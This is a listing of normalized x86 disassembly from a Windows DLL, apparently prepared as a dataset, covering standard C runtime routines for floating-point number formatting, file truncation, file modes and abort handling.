push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_1001a1d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001b629
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1001a067
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_1001b4ad
add esp 0x10
cmp eax ebx
je r-xdata
sub_1001a2a6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a1d6
add esp 0x18
pop ebp
retn
sub_1001a2c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_1000d1a7
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1000ecdb
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1000ecdb
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_1001a2a6
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_1001b330
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1001b7a0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1001b7a0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_1000fe10
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_1001b7a0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_1001b6c0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_1001b6c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_1001b6c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_1001a639
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_1000d1a7
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1000ecdb
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_1001a022
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_1001a022
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_1001a022
push edi
push 0x30
push esi
call sub_1000fe10
add esp 0xc
sub_1001a730
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001b629
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000d8e6
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_1001a639
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1001b4ad
add esp 0x10
cmp eax ebx
je r-xdata
sub_1001a7eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001b629
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_1000d8e6
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1001b4ad
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1001a067
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_1001a639
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_1001a8e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a1d6
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a730
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a2c6
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a7eb
jmp r-xdata
sub_1001a96d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a8e5
add esp 0x1c
pop ebp
retn
sub_1001a990
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1001b7bf
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1000d7be
add esp 0x14
sub_1001a9bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_1001a9f9
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_1001a9bb
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_1001aa22
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c0a5
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_1001abf0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1001ac5b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_100178c8
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_1000ecdb
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_100178c8
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_100178c8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100178c8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1001ae11
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_1000ecdb
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_1000e5ce
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_1000ecdb
mov [ eax ] 0xd
call sub_1000ecee
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_1000ecee
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1000fff0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1001ae11
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_1001ae11
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_1001aecd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1001af25
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_1001af52
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_1000d1a7
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_1001b82b
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001afe5
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_100182df
test eax eax
je r-xdata
push 0xa
call sub_10012ef1
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_100182ec
pop ecx
push 0x3
call sub_10012e7e
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_1000fe10
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
